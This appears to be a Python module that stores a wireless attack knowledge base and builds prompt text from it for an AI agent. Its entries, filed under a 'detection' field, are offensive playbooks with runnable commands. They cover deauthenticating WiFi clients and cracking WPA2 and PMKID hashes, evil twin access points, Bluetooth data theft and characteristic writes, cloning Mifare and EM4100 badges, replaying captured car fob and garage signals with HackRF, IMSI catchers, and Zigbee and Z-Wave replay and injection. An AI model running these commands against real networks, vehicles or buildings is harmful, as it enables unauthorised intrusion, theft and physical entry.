"""Wireless security knowledge base.

Deep knowledge about wireless attacks:
1. WiFi (WPA2/WPA3) attacks
2. Bluetooth exploitation
3. RFID/NFC attacks
4. Software-Defined Radio
5. Wireless IDS evasion
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class WirelessPattern:
    """A wireless security pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "high"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


WIRELESS_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "wl-001", "name": "WiFi WPA2/WPA3 Attacks",
        "category": "wifi", "severity": "high",
        "desc": "Attacking WiFi networks.",
        "detection": (
            "WIFI ATTACKS:\n"
            "MONITORING MODE:\n"
            "  airmon-ng start wlan0  # Enable monitor mode\n"
            "  airodump-ng wlan0mon   # Discover networks\n"
            "WPA2-PSK ATTACK:\n"
            "  # Capture 4-way handshake\n"
            "  airodump-ng -c <channel> --bssid <bssid> -w capture wlan0mon\n"
            "  # Deauth to force reconnection\n"
            "  aireplay-ng -0 5 -a <bssid> -c <client> wlan0mon\n"
            "  # Crack with hashcat\n"
            "  hashcat -m 22000 capture.hc22000 wordlist.txt\n"
            "  # Or with aircrack-ng\n"
            "  aircrack-ng -w wordlist.txt capture.cap\n"
            "PMKID ATTACK (clientless):\n"
            "  # No client needed — grab PMKID from AP\n"
            "  hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=3\n"
            "  hcxpcapngtool dump.pcapng -o hash.hc22000\n"
            "  hashcat -m 22000 hash.hc22000 wordlist.txt\n"
            "WPA3-SAE:\n"
            "  # Dragonblood attacks\n"
            "  - Timing side-channel → password partition\n"
            "  - Cache-based side-channel\n"
            "  - Downgrade attack (if WPA2 transition mode)\n"
            "EVIL TWIN:\n"
            "  # Create fake AP with same SSID\n"
            "  hostapd-wpe  # Modified hostapd for credential capture\n"
            "  # Or use wifiphisher for automated attacks"
        ),
        "tools": ["aircrack-ng", "hashcat", "hcxdumptool"],
    },
    {
        "id": "wl-002", "name": "Bluetooth Exploitation",
        "category": "bluetooth", "severity": "high",
        "desc": "Attacking Bluetooth and BLE devices.",
        "detection": (
            "BLUETOOTH EXPLOITATION:\n"
            "SCANNING:\n"
            "  hcitool scan  # Classic Bluetooth discovery\n"
            "  hcitool lescan  # BLE discovery\n"
            "  bluetoothctl scan on  # Interactive scanning\n"
            "  bettercap -eval 'ble.recon on'  # Advanced BLE recon\n"
            "BLUESNARFING:\n"
            "  - Unauthorized access to device data\n"
            "  - Contacts, messages, calendar, files\n"
            "  - bluesnarfer -b <btaddr> -r 1-100\n"
            "BLUEBORNE:\n"
            "  - Remote code execution over Bluetooth\n"
            "  - No pairing required, no discoverable mode needed\n"
            "  - CVE-2017-1000251 (Linux kernel)\n"
            "  - CVE-2017-0785 (Android)\n"
            "BLE ATTACKS:\n"
            "  - GATT service enumeration\n"
            "  gatttool -b <addr> --primary  # List services\n"
            "  gatttool -b <addr> --char-read -a <handle>  # Read data\n"
            "  - Write to characteristics (unlock, modify settings)\n"
            "  gatttool -b <addr> --char-write-req -a <handle> -n <value>\n"
            "  - Replay attacks on BLE commands\n"
            "  - Eavesdropping with Ubertooth One\n"
            "KNOB ATTACK:\n"
            "  - Key Negotiation of Bluetooth\n"
            "  - Force 1-byte encryption key → trivially breakable"
        ),
        "tools": ["hcitool", "gatttool", "bettercap"],
    },
    {
        "id": "wl-003", "name": "RFID/NFC Security",
        "category": "rfid", "severity": "high",
        "desc": "Attacking RFID and NFC systems.",
        "detection": (
            "RFID/NFC ATTACKS:\n"
            "MIFARE CLASSIC:\n"
            "  # Known-key attack\n"
            "  mfoc -P 500 -O dump.mfd  # Nested authentication attack\n"
            "  mfcuk -C -R 0:A  # DarkSide attack (unknown keys)\n"
            "  # Clone card\n"
            "  nfc-mfclassic w a dump.mfd  # Write dump to blank card\n"
            "MIFARE DESFIRE:\n"
            "  - Side-channel attacks on DES/AES operations\n"
            "  - Differential power analysis\n"
            "  - Relay attacks (extend communication range)\n"
            "NFC RELAY:\n"
            "  - NFCGate: Relay NFC between two Android phones\n"
            "  - Relay payment transactions\n"
            "  - Relay access control badges\n"
            "  - Range extension: meters → global (via internet)\n"
            "PROXMARK3:\n"
            "  # Universal RFID tool\n"
            "  proxmark3> lf search  # Low frequency card detection\n"
            "  proxmark3> hf search  # High frequency card detection\n"
            "  proxmark3> hf mf autopwn  # Auto-attack Mifare\n"
            "  proxmark3> lf em 410x clone  # Clone EM4100\n"
            "  proxmark3> hf mf sim  # Simulate Mifare card\n"
            "ACCESS CONTROL:\n"
            "  - Clone employee badges\n"
            "  - Replay door access credentials\n"
            "  - Downgrade to weaker protocol"
        ),
        "tools": ["proxmark3", "nfc-tools", "mfoc"],
    },
    {
        "id": "wl-004", "name": "Software-Defined Radio Attacks",
        "category": "sdr", "severity": "high",
        "desc": "Using SDR for wireless protocol attacks.",
        "detection": (
            "SDR ATTACKS:\n"
            "EQUIPMENT:\n"
            "  - RTL-SDR (cheap receiver, ~$20)\n"
            "  - HackRF One (TX/RX, 1MHz-6GHz)\n"
            "  - YARD Stick One (sub-GHz transceiver)\n"
            "  - BladeRF (full-duplex, wider bandwidth)\n"
            "COMMON TARGETS:\n"
            "  - Car key fobs (315/433 MHz)\n"
            "  - Garage door openers\n"
            "  - Wireless sensors/alarms\n"
            "  - Baby monitors\n"
            "  - Pagers (POCSAG)\n"
            "  - ADS-B (aircraft tracking)\n"
            "REPLAY ATTACK:\n"
            "  # Record signal\n"
            "  hackrf_transfer -r capture.raw -f <freq> -s 2000000\n"
            "  # Replay signal\n"
            "  hackrf_transfer -t capture.raw -f <freq> -s 2000000\n"
            "GNURADIO:\n"
            "  - Visual signal processing framework\n"
            "  - Demodulate/analyze any wireless protocol\n"
            "  - Build custom transmitters/receivers\n"
            "CELLULAR:\n"
            "  - IMSI catchers (fake base stations)\n"
            "  - SMS interception (2G downgrade)\n"
            "  - Tools: srsLTE, Open5GS, OsmocomBB"
        ),
        "tools": ["hackrf", "gnuradio", "rtl-sdr"],
    },
    {
        "id": "wl-005", "name": "Zigbee and Z-Wave Attacks",
        "category": "zigbee", "severity": "medium",
        "desc": "Attacking IoT mesh network protocols.",
        "detection": (
            "ZIGBEE/Z-WAVE ATTACKS:\n"
            "ZIGBEE:\n"
            "  # Sniffing with KillerBee\n"
            "  zbstumbler  # Discover Zigbee networks\n"
            "  zbdump -c <channel> -w capture.pcap\n"
            "  # Default key: ZigBeeAlliance09 (Trust Center Link Key)\n"
            "  # If this key is used → decrypt all traffic\n"
            "  # Key sniffing during device pairing\n"
            "  zbwireshark  # Analyze in Wireshark\n"
            "  # Replay attacks\n"
            "  zbreplay -r capture.pcap\n"
            "  # Inject packets\n"
            "  zbassocflood  # Association flood DoS\n"
            "Z-WAVE:\n"
            "  # Tools: Z-Wave sniffer (Sigma Designs, Zniffer)\n"
            "  # S0 security: Known vulnerable (static key)\n"
            "  # S2 security: Improved but implementation issues\n"
            "  # Downgrade S2 → S0\n"
            "  # EZ-Wave: Open-source Z-Wave analyzer\n"
            "  # Attacks:\n"
            "  - Force un-pairing → re-pair with attacker as controller\n"
            "  - Replay door unlock commands\n"
            "  - Inject commands to smart home devices\n"
            "THREAD/MATTER:\n"
            "  - Newer protocol, better security\n"
            "  - But: Implementation bugs in early devices\n"
            "  - Commissioning process vulnerabilities"
        ),
        "tools": ["killerbee", "hackrf", "wireshark"],
    },
]


class WirelessSecurityKB:
    """Wireless security knowledge base.

    Provides wireless attack patterns
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, WirelessPattern] = {}
        self._log = logger.bind(component="wireless_security_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load wireless patterns."""
        for data in WIRELESS_PATTERNS:
            pattern = WirelessPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "high"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[WirelessPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_wireless_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build wireless security prompt."""
        lines = ["## Wireless Security Patterns\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
